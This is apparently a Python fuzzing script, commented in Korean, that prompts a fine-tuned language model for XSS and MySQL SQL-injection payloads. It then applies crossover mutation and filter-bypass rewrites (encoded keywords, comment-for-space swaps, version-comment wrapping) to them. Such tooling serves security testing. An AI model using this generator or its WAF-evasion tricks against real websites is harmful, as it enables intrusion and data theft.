import os
import json
import random
import string
import openai

# Initialize OpenAI API key
openai.api_key = {}

# 파일 찾기 함수
def find_latest_file_with_prefix(prefix):
    files = [f for f in os.listdir('.') if f.startswith(prefix) and f.endswith('.json')]
    if not files:
        return None
    return max(files, key=os.path.getctime)

# 입력 필드 정보를 불러오는 함수
def load_input_fields(file_path):
    with open(file_path, "r") as file:
        return json.load(file)

# Function to generate attack prompts based on a specific attack vector
def generate_attack_prompt(attack_type, xss_tag, xss_events, sqli_vendor, sqli_type, n):
    if attack_type not in ["xss", "sqli"]:
        raise ValueError("Invalid attack type. Use 'xss' or 'sqli'.")

    if attack_type == "xss":
        prompt = f"""
        Generate a list of {n} effective XSS payloads based on the following vector: 
        HTML tag: "{xss_tag}"
        Event: "{xss_events}"

        The payloads should exploit this vector and use techniques such as `alert`, `prompt`, or `eval`.
        
        Provide only the payloads, one per line, without additional explanations or text.
        """
    elif attack_type == "sqli":
        prompt = f"""
        Generate a list of {n} effective SQL injection payloads based on the following vector: 
        Vendor: "{sqli_vendor}"
        Type: "{sqli_type}"

        The payloads should exploit and utilize techniques such as `UNION SELECT`, error-based, or time-based injection methods.

        Provide only the payloads, one per line, without additional explanations or text.
        """

    return prompt

def generate_seed(attack_type, xss_tag, xss_events, sqli_vendor, sqli_type, n=10):
    prompt = generate_attack_prompt(attack_type=attack_type, xss_tag=xss_tag, xss_events=xss_events, sqli_vendor=sqli_vendor, sqli_type=sqli_type, n=n)

    response = openai.Completion.create(
        engine="ft:gpt-3.5-turbo-1106:personal::A5rxJ1Dz",  # Fine-tuned model
        prompt=prompt,
        max_tokens=150,  # Adjusted for payloads only
        n=1,
        stop="\n\n"
    )
    
    seeds = response['choices'][0]['text'].strip().split('\n')
    return seeds

# Crossover 변형 함수 (Coarse-grained 및 Fine-grained)
def crossover_mutation(seed1, seed2, granularity="coarse"):
    if granularity == "coarse":
        # &나 다른 구분자를 기준으로 시드 분할 후 교차
        seed1_parts = seed1.split("&")
        seed2_parts = seed2.split("&")
        if len(seed1_parts) > 1 and len(seed2_parts) > 1:
            random_index1 = random.randint(0, len(seed1_parts) - 1)
            random_index2 = random.randint(0, len(seed2_parts) - 1)
            seed1_parts[random_index1], seed2_parts[random_index2] = seed2_parts[random_index2], seed1_parts[random_index1]
        return "&".join(seed1_parts), "&".join(seed2_parts)
    
    elif granularity == "fine":
        # 공백이나 특수문자를 기준으로 시드 분할 후 교차
        seed1_units = seed1.split()
        seed2_units = seed2.split()
        if seed1_units and seed2_units:
            random_index1 = random.randint(0, len(seed1_units) - 1)
            random_index2 = random.randint(0, len(seed2_units) - 1)
            seed1_units[random_index1], seed2_units[random_index2] = seed2_units[random_index2], seed1_units[random_index1]
        return " ".join(seed1_units), " ".join(seed2_units)

# 필터 우회를 위한 변형 함수
def bypass_mutation(seed):
    bypass_methods = [
        lambda x: x.replace("SELECT", "SEL%45ECT"),
        lambda x: x.replace(" ", "/**/"),
        lambda x: x.replace("'", "\\'"),
        lambda x: f"/*!{x}*/"
    ]
    mutation = random.choice(bypass_methods)
    return mutation(seed)


def main():
    input_file = find_latest_file_with_prefix('input_fields_')
    retry_file = find_latest_file_with_prefix('retry_cycle')
    crash_file = 'crash_data.json'

    if not input_file:
        print("No input fields file found.")
        return
    if not retry_file:
        print("No retry file found.")
        return

    input_fields = load_input_fields(input_file)

    # XSS 및 SQLi 페이로드 시드 생성
    xss_tag = "<button>"
    xss_events = "onclick"
    sqli_vendor = "mysql"
    sqli_type = "union select"

    # 초기 시드 생성
    xss_seeds = generate_seed(attack_type="xss", xss_tag=xss_tag, xss_events=xss_events, sqli_vendor='', sqli_type='', n=10)
    sqli_seeds = generate_seed(attack_type="sqli", xss_tag='', xss_events='', sqli_vendor=sqli_vendor, sqli_type=sqli_type, n=10)

    # 교차 및 필터 우회 변형 적용
    for _ in range(3):
        if len(xss_seeds) >= 2:
            seed1 = random.choice(xss_seeds)
            seed2 = random.choice(xss_seeds)
            mutated_seed1, mutated_seed2 = crossover_mutation(seed1, seed2, granularity="coarse")
            xss_seeds.extend([mutated_seed1, mutated_seed2])

        seed_to_bypass = random.choice(xss_seeds)
        bypassed_seed = bypass_mutation(seed_to_bypass)
        xss_seeds.append(bypassed_seed)

    for _ in range(3):
        seed_to_bypass = random.choice(sqli_seeds)
        bypassed_seed = bypass_mutation(seed_to_bypass)
        sqli_seeds.append(bypassed_seed)

    print("Final XSS Payloads:")
    print(json.dumps(xss_seeds, indent=2))

    print("Final SQLi Payloads:")
    print(json.dumps(sqli_seeds, indent=2))

if __name__ == "__main__":
    main()

